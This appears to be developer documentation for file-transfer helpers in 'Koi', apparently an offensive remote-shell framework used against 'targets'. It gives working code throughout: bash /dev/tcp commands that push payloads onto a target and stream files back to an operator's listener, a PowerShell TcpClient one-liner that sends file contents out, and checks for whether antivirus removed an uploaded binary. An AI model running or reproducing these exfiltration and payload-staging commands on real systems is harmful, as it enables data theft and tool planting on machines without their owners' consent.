# Module Development - File Transfer

Koi never uses the shell stream to transfer binary data, it's fragile (encoding issues, prompt noise, ANSI sequences). All transfers go through a **side TCP channel**: a dedicated socket opened between your machine and the target, separate from the interactive shell.

---

## Uploading to the Target

### `self._upload_bytes(raw, dest, timeout=30.0, on_progress=None) -> bool`

Transfers `raw` bytes to `dest` on the target. Handles Linux and Windows automatically. Returns `False` on TCP error or if the file was not written (permission denied, etc.).

```python
bar = self.ui.ProgressBar(total=len(raw))
ok  = self._upload_bytes(raw, "./agent", timeout=60, on_progress=bar.update)
bar.done()
print()
if not ok:
    self.err("Upload failed.")
    return
```

- On **Linux** it uses `cat < /dev/tcp/<ip>/<port> > dest`.
- On **Windows** it sends a PowerShell TCP-read command via `_dispatch_ps`.
- Relative paths (`./agent`, `.\agent.exe`) are resolved against the remote shell's current working directory.

Post-transfer verification is the caller's responsibility, AV/EDR may silently delete the file after upload.

```python
# Linux verification
result = self.exec(f"test -s {dest} && echo OK || echo MISS")
if "OK" not in result.stdout:
    self.err("File missing after upload.")
    return
self.exec(f"chmod +x {dest}")

# Windows verification
check = self._win_query(f"(Test-Path '{dest}').ToString()")
if check.strip().lower() != "true":
    self.err("File missing after upload, likely removed by AV.")
    return
```

---

## Downloading from the Target

Downloads work in reverse: you open a local TCP listener, tell the remote to connect and send the file, then collect the bytes.

### TCPReceiveServer

The recommended way to receive data from the target.

```python
from koi.modules.blueprint import KoiModule, TCPReceiveServer
```

**Constructor:**

```python
TCPReceiveServer(timeout=30.0, on_progress=None)
```

| Parameter | Description |
|---|---|
| `timeout` | Seconds to wait for connection and full transfer |
| `on_progress` | Optional `fn(bytes_received: int)` called after each chunk |

**Methods:**

| Method | Returns | Description |
|---|---|---|
| `.start()` | `self` | Binds socket, starts background thread, sets `.port` |
| `.collect()` | `bytes` | Blocks until done. Raises `RuntimeError` or `TimeoutError` on failure |
| `.stop()` | - | Closes socket (called automatically on context manager exit) |

**Full download pattern:**

```python
bar  = self.ui.ProgressBar(total=remote_size or 0)
srv  = TCPReceiveServer(timeout=60, on_progress=bar.update).start()
port = srv.port

if os_type == "linux":
    self.exec(f"cat {quoted} > /dev/tcp/{local_ip}/{port}", timeout=60)
else:
    ps_cmd = (
        f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
        f"$_s=$_c.GetStream();"
        f"$_f=[IO.File]::OpenRead((Get-Item '{remote_path}').FullName);"
        f"$_b=New-Object byte[] 65536;"
        f"while(($_n=$_f.Read($_b,0,$_b.Length))-gt 0){{$_s.Write($_b,0,$_n)}};"
        f"$_f.Close();$_s.Flush();$_c.Close()"
    )
    self._dispatch_ps(ps_cmd)

try:
    raw = srv.collect()
except (RuntimeError, TimeoutError) as exc:
    self.err(f"Transfer failed: {exc}")
    return
bar.done()
print()

with open(local_path, "wb") as f:
    f.write(raw)
```

!!! note
    On Windows, use `(Get-Item '{path}').FullName` to resolve relative paths before passing to `[IO.File]::OpenRead`. .NET and PowerShell use different working directories.

---

## Local Cache

The built-in cache stores files locally under `~/.koi/cache/` so they remain available even when the operator is offline. It is a simple key-value store, the fallback logic is up to the module author.

```python
from koi.utils.cache import put_cache, get_cache, has_cache, cache_path
```

### `put_cache(name, data) -> None`

Store bytes in the cache under `name`.

```python
put_cache("my_tool.exe", raw_bytes)
```

### `get_cache(name) -> bytes | None`

Return cached bytes, or `None` if not cached yet.

```python
raw = get_cache("my_tool.exe")
if raw is None:
    raw = download_from_github()
    put_cache("my_tool.exe", raw)
```

### `has_cache(name) -> bool`

Check existence without reading.

### `cache_path(name) -> Path`

Return the full path of the cached file, useful for notifications.

```python
self.warn(f"Using cached version ({cache_path('my_tool.exe')})")
```

---

## Example - Windows upload with AV check

```python
ok = self._upload_bytes(raw, dest, timeout=60)
if not ok:
    self.err("Transfer failed.")
    return

time.sleep(1.0)   # give AV time to act
check = self._win_query(f"(Test-Path '{dest}').ToString()")
if check.strip().lower() != "true":
    self.err("File not present after upload, likely removed by AV.")
    return

self.ok(f"Uploaded to {dest}")
```
